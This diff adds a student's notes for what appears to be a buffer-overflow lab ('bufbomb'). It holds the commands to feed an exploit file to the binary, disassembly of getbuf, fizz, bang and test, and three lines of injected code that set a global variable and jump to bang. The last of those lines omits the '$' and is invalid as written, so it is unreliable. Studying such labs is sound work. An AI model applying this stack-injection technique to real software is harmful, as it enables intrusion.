@@ -1,0 +1,112 @@
+cookie: 0x5e558750
+./sendstring < exploit.txt > exploit-raw.txt
+./bufbomb -t SA22225140 < exploit-raw.txt
+
+
+08048e20 <smoke>:
+
+
+
+08048fe0 <getbuf>:
+ 8048fe0:	55                   	push   %ebp
+ 8048fe1:	89 e5                	mov    %esp,%ebp
+ 8048fe3:	83 ec 18             	sub    $0x18,%esp
+ 8048fe6:	8d 45 f4             	lea    -0xc(%ebp),%eax
+ 8048fe9:	89 04 24             	mov    %eax,(%esp)
+ 8048fec:	e8 6f fe ff ff       	call   8048e60 <Gets>
+ 8048ff1:	b8 01 00 00 00       	mov    $0x1,%eax
+ 8048ff6:	c9                   	leave  
+ 8048ff7:	c3                   	ret    
+ 8048ff8:	90                   	nop
+ 8048ff9:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi
+
+
+
+
+ 08048dc0 <fizz>:
+ 8048dc0:	55                   	push   %ebp
+ 8048dc1:	89 e5                	mov    %esp,%ebp
+ 8048dc3:	53                   	push   %ebx
+ 8048dc4:	83 ec 14             	sub    $0x14,%esp
+ 8048dc7:	8b 5d 08             	mov    0x8(%ebp),%ebx//获取输入val
+ 8048dca:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
+ 8048dd1:	e8 ca fb ff ff       	call   80489a0 <entry_check>
+ 8048dd6:	3b 1d cc a1 04 08    	cmp    0x804a1cc,%ebx
+ 8048ddc:	74 22                	je     8048e00 <fizz+0x40>
+ 8048dde:	89 5c 24 04          	mov    %ebx,0x4(%esp)
+ 8048de2:	c7 04 24 98 98 04 08 	movl   $0x8049898,(%esp)
+ 8048de9:	e8 76 f9 ff ff       	call   8048764 <printf@plt>
+ 8048dee:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
+ 8048df5:	e8 aa f9 ff ff       	call   80487a4 <exit@plt>
+ 8048dfa:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
+ 8048e00:	89 5c 24 04          	mov    %ebx,0x4(%esp)
+ 8048e04:	c7 04 24 29 9a 04 08 	movl   $0x8049a29,(%esp)
+ 8048e0b:	e8 54 f9 ff ff       	call   8048764 <printf@plt>
+ 8048e10:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
+ 8048e17:	e8 c4 fc ff ff       	call   8048ae0 <validate>
+ 8048e1c:	eb d0                	jmp    8048dee <fizz+0x2e>
+ 8048e1e:	89 f6                	mov    %esi,%esi
+
+
+
+ 08048d60 <bang>:
+ 8048d60:	55                   	push   %ebp
+ 8048d61:	89 e5                	mov    %esp,%ebp
+ 8048d63:	83 ec 08             	sub    $0x8,%esp
+ 8048d66:	c7 04 24 02 00 00 00 	movl   $0x2,(%esp)
+ 8048d6d:	e8 2e fc ff ff       	call   80489a0 <entry_check>
+ 8048d72:	a1 dc a1 04 08       	mov    0x804a1dc,%eax//取出 gobal_val
+ 8048d77:	3b 05 cc a1 04 08    	cmp    0x804a1cc,%eax
+ 8048d7d:	74 21                	je     8048da0 <bang+0x40>
+ 8048d7f:	89 44 24 04          	mov    %eax,0x4(%esp)
+ 8048d83:	c7 04 24 0b 9a 04 08 	movl   $0x8049a0b,(%esp)
+ 8048d8a:	e8 d5 f9 ff ff       	call   8048764 <printf@plt>
+ 8048d8f:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
+ 8048d96:	e8 09 fa ff ff       	call   80487a4 <exit@plt>
+ 8048d9b:	90                   	nop
+ 8048d9c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
+ 8048da0:	89 44 24 04          	mov    %eax,0x4(%esp)
+ 8048da4:	c7 04 24 70 98 04 08 	movl   $0x8049870,(%esp)
+ 8048dab:	e8 b4 f9 ff ff       	call   8048764 <printf@plt>
+ 8048db0:	c7 04 24 02 00 00 00 	movl   $0x2,(%esp)
+ 8048db7:	e8 24 fd ff ff       	call   8048ae0 <validate>
+ 8048dbc:	eb d1                	jmp    8048d8f <bang+0x2f>
+ 8048dbe:	89 f6                	mov    %esi,%esi
+
+
+08049000 <test>:
+ 8049000:	55                   	push   %ebp
+ 8049001:	89 e5                	mov    %esp,%ebp
+ 8049003:	83 ec 18             	sub    $0x18,%esp
+ 8049006:	c7 45 fc ef be ad de 	movl   $0xdeadbeef,-0x4(%ebp)
+ 804900d:	c7 04 24 03 00 00 00 	movl   $0x3,(%esp)
+ 8049014:	e8 87 f9 ff ff       	call   80489a0 <entry_check>
+ 8049019:	e8 c2 ff ff ff       	call   8048fe0 <getbuf>
+ 804901e:	89 c2                	mov    %eax,%edx
+ 8049020:	8b 45 fc             	mov    -0x4(%ebp),%eax
+ 8049023:	3d ef be ad de       	cmp    $0xdeadbeef,%eax
+ 8049028:	74 0e                	je     8049038 <test+0x38>
+ 804902a:	c7 04 24 b8 98 04 08 	movl   $0x80498b8,(%esp)
+ 8049031:	e8 de f6 ff ff       	call   8048714 <puts@plt>
+ 8049036:	c9                   	leave  
+ 8049037:	c3                   	ret    
+ 8049038:	3b 15 cc a1 04 08    	cmp    0x804a1cc,%edx
+ 804903e:	74 12                	je     8049052 <test+0x52>
+ 8049040:	89 54 24 04          	mov    %edx,0x4(%esp)
+ 8049044:	c7 04 24 9b 9a 04 08 	movl   $0x8049a9b,(%esp)
+ 804904b:	e8 14 f7 ff ff       	call   8048764 <printf@plt>
+ 8049050:	c9                   	leave  
+ 8049051:	c3                   	ret    
+ 8049052:	89 54 24 04          	mov    %edx,0x4(%esp)
+ 8049056:	c7 04 24 7e 9a 04 08 	movl   $0x8049a7e,(%esp)
+ 804905d:	e8 02 f7 ff ff       	call   8048764 <printf@plt>
+ 8049062:	c7 04 24 03 00 00 00 	movl   $0x3,(%esp)
+ 8049069:	e8 72 fa ff ff       	call   8048ae0 <validate>
+ 804906e:	c9                   	leave  
+ 804906f:	c3                   	ret    
+
+
+
+movl 0x5e558750, 0x0804a1dc
+push $0x08048d60
+ret
